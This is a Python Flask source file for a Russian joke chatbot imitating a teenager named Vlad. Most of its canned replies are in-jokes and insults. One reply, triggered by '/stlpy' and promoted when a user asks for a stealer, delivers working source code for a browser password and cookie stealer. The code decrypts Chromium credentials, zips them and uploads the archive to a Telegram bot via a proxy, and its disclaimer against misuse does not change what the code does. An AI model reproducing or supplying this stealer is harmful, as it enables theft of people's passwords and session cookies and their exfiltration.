# app.py
from flask import Flask, render_template, request, jsonify
from time import sleep

app = Flask(__name__)

# Словарь для хранения ответов на вопросы
chat_responses = {
    "привет": "Здаров! Я чат-бот обученный на ответах Влада Аганина ",
    "как дела?": "У меня всё отлично, спасибо!",
    "Как дела": "У меня всё отлично, спасибо!",
    "ты нюхал тапок аркадия?": "Да, и дом труба шатал",
    "ты нюхал тапок паши?": "да, и топтал его тапок",
    "сколько тебе лет?": "82, я совсем дедушка",
    "твоя любимая фраза": "'Я твой башмак топтал'",
    "Какой сейчас год": "Я тебе интернет что ли",
    "кто ты": "Меня зовут Влад, мне 82 года (по паспотру 15 (это ложь)). Я люблю играть в танки.",
    "кто создал тебя": "Никто. Я пупс",
    "сделай дз": "Нет. Я слишком умный для этого",
    "Влад Аганин": "Это я.",
    "Я твой": "Башмак топтал",
    "ты губошлеп?": "Нет(я люблю свои пышные губки)",
    "Чьи тапки ты нюхал?": "Аркадия, Паши и свои",
    "Я твой": "Башмак топтал",
    "чей бышмак ты нюхал": "Всех и свой",
    "влад чмо": "Я твой дом труба шатал",
    "влад лох": "Башмак твой топтал",
    "ты лох": "Башмак твой топтал",
    "ты чмо": "Твой дом труба шатал",
    "сталин": "Мой кумир и советский человек как и я",
    "кто такой сталин": "Я",
    "гитлер": "Плохой человек, хоть и усики у нас одинаковые",
    "ты гитлер": "я сталин",
    "расскажи что нибудь": "давай расскажу тебе историю о том как я чуть не умер на 2 мировой войне. В 1942 году началась Сталинградская битва ставшая началом перелома хода войны. Наши соотечественники защищали город как с суши, с воды – о подвиге волжских речников в Сталинграде рассказывает книга Ю. Берковича и А. Лебедева-Морского «Это было на сталинградских переправах» (1944 г.), – так и с воздуха. В издании «Бойцы МПВО героического Сталинграда», размещённой на портале Президентской библиотеки, даётся портрет героических участников сил местной противовоздушной обороны, среди которых было много обычных мирных жителей, много женщин. 23 августа 1942 года Сталинград подвергся первой массированной воздушной бомбардировке, уничтожившей едва ли не половину города. «Немцы стали бросать на город сначала 150 самолётов, затем 300, с каждым часом увеличивая количество стервятников», – говорится в упомянутой книге о подвиге бойцов МПВО. И хотя в первый день массированных налётов советские лётчики и зенитчики сбили почти 100 фашистских самолётов, на второй – ещё около 60, бомбардировки не прекращались. «Так был разрушен в центре города прекрасный Дворец пионеров. Так погибли Дворец физкультуры, замечательная городская библиотека, хранившая сотни тысяч ценнейших книг. Так были варварски уничтожены больницы, школы, учебные заведения, сотни жилых домов». И я там был, и по мне стреляли:(",
    "океан": "помойка в океане",
    "": "твой запрос как помойка в океане",
    "расскажи про 2 мировую войну": "Вторая мировая война (1939-1945) была одним из самых разрушительных конфликтов в истории человечества, охватившим практически все континенты и повлекший за собой огромные человеческие потери и разрушения. Вот краткое изложение ключевых событий.<br /> <b>Причины и начало:</b> Вторая мировая война началась 1 сентября 1939 года, когда Германия под руководством Адольфа Гитлера напала на Польшу. В ответ Франция и Великобритания объявили войну Германии<br /><b>Основные участники:</b> Основными участниками конфликта были союзники, включая США, Великобританию, СССР и другие, а также Ось, состоящая преимущественно из Германии, Италии и Японии.",
    "расскажи о себе": "Меня зовут Влад, мне 82 года (по паспотру 15 (это ложь)). Я люблю играть в танки.",
    "бляяя": "не матерись пес",
    "бляя": "тихо пупс",
    "ахахаха": "Я влад и что?",
    "ты пупс": "И что?",
    "/stlpy": """
<code>
import os<br />
import sqlite3<br />
import zipfile<br />
import requests<br />
from ctypes import *<br />
from winreg import *<br />
from json import load<br />
from os import listdir<br />
from shutil import copy<br />
from struct import calcsize<br />
from base64 import b64decode<br />
from Crypto.Cipher import AES<br />
from psutil import process_iter<br />
from win32api import GetModuleHandle<br />
from win32crypt import CryptUnprotectData<br />
PasswordsArray = []#переменная для сбора паролей<br />
CookiesDict = ''#переменная для сбора cookie<br />
def db_dirs(path):#Передаем путь к браузеру<br />
####databases = set()#Обьявляем список<br />
####profiles_path = os.path.join(path, u'Local State')#<br />
####if os.path.exists(profiles_path):#<br />
########profiles = {'Default', ''}#<br />
########for dirs in os.listdir(path):#Ищет профили<br />
############dirs_path = os.path.join(path, dirs)#<br />
############if os.path.isdir(dirs_path) and dirs.startswith('Profile'):#<br />
################profiles.add(dirs)#<br />
########with open(profiles_path) as f:<br />
############try:<br />
################data = load(f)<br />
################profiles |= set(data['profile']['info_cache'])#Нужно для получения мастер-ключа<br />
############except Exception:<br />
################pass<br />
########with open(profiles_path) as f:<br />
############try:<br />
################master_key = b64decode(load(f)["os_crypt"]["encrypted_key"])<br />
################master_key = master_key[5:]<br />
################master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]#О, мастер-ключ<br />
############except Exception:<br />
################master_key = None<br />
########for profile in profiles:<br />
############try:<br />
################db_files = os.listdir(os.path.join(path, profile))<br />
############except Exception:<br />
################continue<br />
############for db in db_files:<br />
################if db.lower() in ['login data','cookies']:<br />
####################databases.add((os.path.join(path, profile, db), master_key))#Возвращаем пути до всех бд которые удалось найти<br />
####return databases<br />
def decryption(buff, key):#Нужна для декрипта, просто скопипасть, не парься<br />
####payload = buff[15:]<br />
####iv = buff[3:15]<br />
####cipher = AES.new(key, AES.MODE_GCM, iv)<br />
####decrypted_pass = cipher.decrypt(payload)<br />
####decrypted_pass = decrypted_pass[:-16].decode()<br />
####return decrypted_pass<br />
def passwords(name, path, database_path, master_key):#Ну пароли дешифрует, чо, какие вопросы<br />
####copy(path, database_path)<br />
####cursor = sqlite3.connect(database_path).cursor()<br />
####cursor.execute('SELECT action_url, username_value, password_value FROM logins')<br />
####for result in cursor.fetchall():<br />
########url = result[0]<br />
########login = result[1]<br />
########try:<br />
############password = decryption(result[2], master_key)<br />
########except Exception:<br />
############password = "Error"<br />
########if url and login and password != '':<br />
############PasswordsArray.append(<br />
################'Browser: ' + name + '\nLink: ' + url + '\nLogin: ' + login + '\nPassword: ' + password + '\n')<br />
def cookies(name, path, database_path, master_key):<br />
####Cookies = [] #Куки добавляются сюда<br />
####copy(path, database_path)#Копируем базу<br />
####cursor = sqlite3.connect(database_path).cursor()#Коннектимся к базе<br />
####cursor.execute("SELECT * from cookies")#Читаем куки<br />
####for result in cursor.fetchall():<br />
########try:<br />
############cookie = decryption(result[12], master_key)#Декриптим куки<br />
########except Exception:<br />
############return<br />
########cookie_name = result[2]<br />
########exp = result[5]<br />
########if result[6]:#Достаем значения для записи в net-scape формат<br />
############secure = "TRUE"<br />
########else:<br />
############secure = "FALSE"<br />
########if result[7]:<br />
############isHttp = "TRUE"<br />
########else:<br />
############isHttp = "FALSE"<br />
########path = result[4]<br />
########url = result[1].replace("https://", "").replace("http://", "").split("/")[0]<br />
########Cookies.append((url + "\t" + secure + "\t" + path + "\t" + isHttp + "\t" + str(#Записываем куки в net-scape формате<br />
############exp / 1000000) + "\t" + cookie_name + "\t" + str(cookie)))<br />
####for i in range(0, 100):<br />
########if i >= 1:<br />
############if name + str(i) in CookiesDict:#короч эта штука<br />
################continue#если найдено несколько профилей<br />
############else:<br />
################CookiesDict[name + str(i)] = Cookies#то записывает куки<br />
################break<br />
########else:<br />
############if name in CookiesDict:#с одного браузера<br />
################continue<br />
############else:<br />
################CookiesDict[name] = Cookies#В разные текстовики<br />
################break<br />
def helper(name, path, database_path, master_key):<br />
####if database_path.endswith("Cookies"):#Оп, куки<br />
########copyPath = path + '\Backup Cookies'#Копируем бд, ибо читать из оригинала, когда запущен браузер, нельзя<br />
########cookies(name, database_path, copyPath, master_key)#Дешифруем куки<br />
####if database_path.endswith("Login Data"):#Оп, пароли<br />
########copyPath = path + '\Backup Password'<br />
########passwords(name, database_path, copyPath, master_key)#Дешифруем пароли<br />
if __name__ == "__main__":<br />
#пути до браузеров выше
for browser, path in chromium_browsers.items():<br />
####if os.path.exists(path):#Есть ли браузер<br />
########for database_path, master_key in db_dirs(path):#Функция поиска баз и мастер-ключа<br />
############helper(browser, path, database_path, master_key)#Отправляет куки в декод куков, пароли в декод паролей<br />
try:<br />
####os.makedirs(os.getenv("TEMP") + '\\Debug\\')#Здесь будет наш архив<br />
#except OSError:<br />
####pass<br />
path_main = os.getenv("TEMP") + '\\Debug\\'<br />
zipload = zipfile.ZipFile(os.path.join(path_main, "MyZip" + ".zip"), 'w')#Создаем архив и насовываем ему наши данные<br />    
if(len(PasswordsArray) > 0):<br />
####file = open(os.path.join(path_main, "Passwords.txt"), "w+", encoding='utf-8')<br />
####file.write("\n".join(PasswordsArray))#Пишем пароли в текстовик<br />
####file.close()<br />
####zipload.write(os.path.join(path_main, "Passwords.txt"),<br />
###################"\\Browsers\\" + os.path.basename(os.path.join(path_main, "Passwords.txt")))#Суем текстовик в архив, ниже кста также<br />
if(len(CookiesDict) > 0):<br />
####for browser, cooks in CookiesDict.items():<br />
########file = open(path_main + "\\" + browser + ".txt", "w+", encoding='utf-8')<br />
########file.write("\n".join(cooks))<br />
########file.close()<br />
########zipload.write(path_main + "\\" + browser + ".txt", "\\Cookies\\" + browser + ".txt")<br /> 
zipload.close()
</code><br />
<b>КОД ДЛЯ ОТПРАВКИ ЛОГА В ТЕЛЕГРАМ БОТА:</b><br />
<code>
zipPath = os.path.join(path_main, "myZip" + ".zip")<br />
token = "токен бота"<br />
chat_id = "твой chat id"<br />
proxy_array = ["198.27.69.175:3128"}#Твоя прокся<br />
data = {'chat_id': chat_id}<br />
r = requests<br />
files = {'document': open(zipPath, 'rb')}<br />
response = r.post("https://api.telegram.org/bot" + token + "/sendDocument", files=files, data=data,<br />
###################proxies={'https': 'https://' + proxy}, timeout=(1, 10))<br />
<b>Вместо решеток (#) сделайте реальные отступы</b><br />
<b>Я специально усложнил копирование этого кода, потому что я башмак топтал всех тех, кто пишет эти стиллеры. И не рекомендую использовать данный код в целях воровства чужих паролей, это незаконно.</b>
</code>""",
    "напиши стиллер": "Давай, сейчас я покажу тебе Python код для стиллер паролей из браузеров. Что бы получить код стиллера паролей используйте команду <i>/stlpy</i>",
    }

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/get_response", methods=["POST"])
def get_response():
    sleep(0.5)
    user_input = request.json["input"]
    response = chat_responses.get(user_input.lower(), "На этот запрос я не могу ответить, так как на него не обучен. Если этот запрос показался вам важным пришлите его в нашего бота обратной связи, и меня обучат:) <i>БОТ - https://t.me/feedback_vlad_bot</i>")
    sleep(0.5)
    return jsonify({"response": response})
    
if __name__ == "__main__":
    app.run(debug=True)
